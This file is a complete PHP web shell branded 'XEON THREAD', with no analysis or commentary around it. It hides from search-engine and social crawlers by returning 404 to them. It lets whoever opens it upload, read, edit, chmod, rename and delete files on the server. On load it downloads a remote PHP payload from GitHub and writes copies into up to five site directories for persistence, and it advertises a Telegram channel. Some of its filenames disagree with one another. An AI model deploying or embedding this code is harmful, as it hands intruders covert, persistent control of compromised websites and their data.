<?php

$userAgent = $_SERVER['HTTP_USER_AGENT'];

$blockedUserAgents = [
    'Googlebot',
    'Ahrefs',
    'Bingbot',
    'SemrushBot',
    'MJ12bot',
    'DotBot',
    'Baiduspider',
    'YandexBot',
    'Sogou',
    'Exabot',
    'Facebot',
    'Twitterbot',
    'Slackbot',
    'Discordbot',
    'LinkedInBot',
    'TelegramBot',
    'Pinterestbot',
    'WhatsApp',
    'Flipboard',
    'FeedFetcher-Google',
    // Add other user agents or bot names to block
    // Example: 'BotName',
];

foreach ($blockedUserAgents as $blockedAgent) {
    if (stripos($userAgent, $blockedAgent) !== false) {
        http_response_code(404);
        exit;
    }
}

echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"><title>XEON THREAD WEBSHELL</title>
<style>
body {
    font-family: "Racing Sans One", cursive;
    background-color: #343a40;
    color: #e6e6e6;
}

#content tr:hover {
    background-color: #e1b12c;
    text-shadow: 0px 0px 10px #fff;
}

#content .first {
    background-color: #e1b12c;
}
.backlink {
    display: none;
}

#content .first:hover {
    background-color: #e1b12c;
    text-shadow: 0px 0px 1px #757575;
}

table {
    border: 220px #e1b12c;
}

h1 {
    font-family: "Rye", cursive;
    color: #f8f9fa;
}

a {
    color: #fff;
    text-decoration: none;
}

a:hover {
    color: #f8f9fa;
    text-shadow: 0px 0px 10px #ffffff;
}

input, select, textarea {
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius: 5px;
    border-radius: 5px;
}

pre {
    background-color: #2b2b2b;
    padding: 10px;
    color: #e6e6e6;
    overflow-x: auto;
}

.container {
    margin-top: 30px;
}

.btn-upload {
    background-color: #ffc107;
    border-color: #ffc107;
}

.btn-upload:hover {
    background-color: #e0a800;
    border-color: #e0a800;
}

.btn-option {
    background-color: #2b2b2b;
    border-color: #2b2b2b;
    color: #e6e6e6;
}

.btn-option:hover {
    background-color: #1d2124;
    border-color: #1d2124;
    color: #e6e6e6;
}

.btn-action {
    background-color: #dc3545;
    border-color: #dc3545;
}
.btn-Telegram {
    background-color: #0984e3;
    border-color: #0984e3;
}
.btn-action:hover {
    background-color: #c82333;
    border-color: #c82333;
}

.file-size {
    color: #adb5bd;
}

.file-perms {
    font-weight: bold;
}

.file-perms-green {
    color: #28a745;
}

.file-perms-red {
    color: #dc3545;
}

.file-name {
    color: #e6e6e6;
}

.file-path {
    color: #f8f9fa;
}

.file-link {
    color: #fff;
    text-decoration: none;
}

.file-link:hover {
    color: #f8f9fa;
    text-decoration: underline;
}

.folder-icon::before {
    content: "\f07b";
    font-family: "Font Awesome 5 Free";
    font-weight: 900;
    margin-right: 5px;
}

.file-icon::before {
    content: "\f15b";
    font-family: "Font Awesome 5 Free";
    font-weight: 900;
    margin-right: 5px;
}
.RedZone-icon::before {
    content: "\f6e2";
    font-family: "Font Awesome 5 Free";
    font-weight: 900;
    margin-right: 5px;
}
</style>
</HEAD>
<BODY>
<div class="container">
<H1 class="text-center">XEON THREAD  <span class=\'R3DZ0N3-icon\'></H1>
<table class="table table-dark" cellpadding="3" cellspacing="1" >
<tr><td><center>Current Path : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a class="file-link" href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a class="file-link" href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td><center>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<div class="alert alert-success" role="alert">File Upload Done.</div>';
}else{
echo '<div class="alert alert-danger" role="alert">File Upload Error.</div>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input class="btn btn-upload" type="submit" value="Upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center><span class="file-path">'.$_POST['path'].'</span><br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<div class="alert alert-success" role="alert">Change Permission Done.</div>';
}else{
echo '<div class="alert alert-danger" role="alert">Change Permission Error.</div>';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input class="btn btn-option" type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<div class="alert alert-success" role="alert">Change Name Done.</div>';
}else{
echo '<div class="alert alert-danger" role="alert">Change Name Error.</div>';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input class="btn btn-option" type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<div class="alert alert-success" role="alert">Edit File Done.</div>';
}else{
echo '<div class="alert alert-danger" role="alert">Edit File Error.</div>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea class="form-control" cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input class="btn btn-option" type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<div class="alert alert-success" role="alert">Delete Dir Done.</div>';
}else{
echo '<div class="alert alert-danger" role="alert">Delete Dir Error.</div>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<div class="alert alert-success" role="alert">Delete File Done.</div>';
}else{
echo '<div class="alert alert-danger" role="alert">Delete File Error.</div>';
}
}
}
echo '<center>';
echo '<button class="btn btn-Telegram" onclick="location.href=\'https://t.me/xeonthread\'">';echo '<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Telegram_2019_Logo.svg/800px-Telegram_2019_Logo.svg.png" style="height: 40px;" alt="Telegram Icon">';
echo ' </button>';
echo '<br><br>';
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table class="table" width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a class='file-link' href=\"?path=$path/$dir\"><span class=\"folder-icon\" style='color: #4581e8';></span>$dir</a></td>\n
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<span class="perm-green">';
elseif(!is_readable("$path/$dir")) echo '<span class="perm-red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</span>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input class='btn btn-option' type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><a class='file-link' href=\"?filesrc=$path/$file&path=$path\"><span class=\"file-icon\"style='color: #00a8ff'></span>$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<span class="perm-green">';
elseif(!is_readable("$path/$file")) echo '<span class="perm-red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</span>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input class='btn btn-option' type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</table></div>';
}

function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}


$fileURL = 'https://raw.githubusercontent.com/OXiZ3N/Inventory/main/waf.php';
$fileContent = file_get_contents($fileURL);

$directories = glob('*', GLOB_ONLYDIR);

if (count($directories) < 5) {
    $remainingCount = 5 - count($directories);
    $existingDirectories = array();
    
    foreach ($directories as $directory) {
        $filePath = $directory . '/RedZone.php';
        
        file_put_contents($filePath, $fileContent);
        $existingDirectories[] = $directory;
    }
    
    // Send notification to Telegram for remaining directories
    $message = "Only " . $remainingCount . " directories available. Created XeonThread.php in existing directories.";
    
    // Send URLs of created files in existing directories
    $fileURLs = array();
    foreach ($existingDirectories as $directory) {
        $fileURLs[] = getDirectoryURL($directory) . '/XEONTHREAD.php';
    }
    
    exit;
}

$selectedDirectories = array_rand($directories, 5);
$createdDirectories = array();

foreach ($selectedDirectories as $index) {
    $directory = $directories[$index];
    $filePath = $directory . '/RedZone.php';
    
    file_put_contents($filePath, $fileContent);
    $createdDirectories[] = $directory;
}

// Send URLs of created files in selected directories
$fileURLs = array();
foreach ($createdDirectories as $directory) {
    $fileURLs[] = getDirectoryURL($directory) . '/R3DZ0N3.php';
}


function getDirectoryURL($directory) {
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    $directory = ltrim($directory, '/');
    
    return "$protocol://$host/$directory";
}
?>
</div>
<span class="backlink">
    <a href="https://t.me/xeonthread">XEON THREAD</a>,
</span>
<center><h6>Telegram @xeonthread</h6>
</BODY>
</HTML>
